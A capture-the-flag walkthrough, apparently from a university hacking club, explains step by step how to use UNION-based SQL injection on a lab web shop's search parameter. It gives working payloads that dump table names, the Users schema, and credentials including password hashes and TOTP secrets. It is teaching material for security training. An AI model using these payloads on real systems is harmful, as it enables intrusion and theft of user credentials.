# Challenge 1 - Admin Login

Try and use SQLi to dump all user credentials!

<details>
  <summary>Click me for a hint</summary>
  
  ```
  Try and capture the search api in burp, the q= parameter might not like certain inputs.
  ```
</details>

<details>
  <summary>Click me for all the spoilers</summary>
  
  # Spoilers
  
  Firstly, make sure burp is intercepting and refresh the main page.
  
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/1.png">
  </p>
  
  Foward the requests until you reach the search api `/rest/products/search?q=`. Once found, right click and `Send to Repeater`.
  
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/2.png">
  </p>
  
  Once the request has been captured in burp, right click and `Send to Repeater`.
  
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/3.png">
  </p>
  
  If we send the request with a `'`, we get success. Let's try a prompt an error message.
  
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/4.png">
  </p>
  
  By putting `aaa'` as our parameter, we got an error. Notice the `SQLITE_ERROR`, this tells us that the backend database is SQLITE, this is useful we now know the specific syntax required for injection (using a bit of Google-Fu). 
  
  The query is: `SELECT * FROM Products WHERE ((name LIKE '%<input>%' OR description LIKE '%<input>%') AND deletedAt IS NULL) ORDER BY name`.
  
  It's a longer one than last time, but we can still inject into it. As we want to dump the database, we'll be using `UNION SELECT` to inject.
  
  The first thing we need to do is enumerate how many columns are actually being displayed when we perform as search. We can do that using `aaa')) union select 1 --` (if there is only 1 column, we shouldn't get an error).
  
  So the new query should look like: `SELECT * FROM Products WHERE ((name LIKE '%aaa')) union select 1 -- ` ~~%' OR description LIKE '%<input>%') AND deletedAt IS NULL) ORDER BY name~~

  Let's try it. We also need to ensure we are url encoding our text as it will be sent within the url of the request, not the data like last time.

  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/5.png">
  </p>

  Our first request injection request should look like this. Once it's sent, we receive a different error.
  
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/6.png">
  </p>
  
  The error states `SELECTs to the left and right of UNION do not have the same number of result columns`. This means that there are either more or less than 1 columns.
  
  Lets try 2 instead!
  
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/7.png">
  </p>
    
  Nope, same message.
  
  Let's try 3!
  
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/8.png">
  </p>
  
  Nope...
  
  Let's continue until we no longer get that message.
  
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/9.png">
  </p>
  
  Eventually we see that there are a total of 9 columns being displayed by the search function.
  
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/10.png">
  </p>

  Now that we know the amount of columns, we can being enumerating and dumping data from the database. As we know the backend database is using SQLITE, we can tailor our injection to that format.
  
  Let's start by dumping the table names. This can be done with the following query:
  
    aaa')) union select 1,2,3,4,5,6,7,8,tbl_name from sqlite_master -- 
  
  and when url encoded:
  
    aaa'))+union+select+1,2,3,4,5,6,7,8,tbl_name+from+sqlite_master+--+
    
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/11.png">
  </p>

  When we send this query, column 9 should include the table names. 
  
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/12.png">
  </p>
  
  Now we know the table names, let's try and get the column names from the table 'Users'. Our modified query will look like this:
   
    aaa')) union select 1,2,3,4,5,6,7,8,sql from sqlite_master where tbl_name = 'Users' -- 
    
  and when url encoded:
  
    aaa'))+union+select+1,2,3,4,5,6,7,8,sql+from+sqlite_master+where+tbl_name='Users'+--+
    
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/13.png">
  </p>
  
  Let's send the request and see what we get.
    
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/14.png">
  </p>
  
  Now we know the column names, we can get all the data held within this table. Let's grab the `id`, `username`, `email`, `password`, `role`, and `totpSecret`.
  
  Our query should look like:
  
    aaa')) union select id,username,email,password,role,totpSecret,7,8,9 from Users -- 
  
  and when url encoded:
  
    aaa'))+union+select+id,username,email,password,role,totpSecret,7,8,9+from+Users+--+
    
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/15.png">
  </p>
  
  Let's send our request!
  
    
  <p align="center">
	<img src="https://github.com/DMUHackers/weekly_sessions/blob/master/2020-2021/week_7/challenge_2/ch2shots/16.png">
  </p>

  Success! We have dumped the table holding the user credentials.

</details>
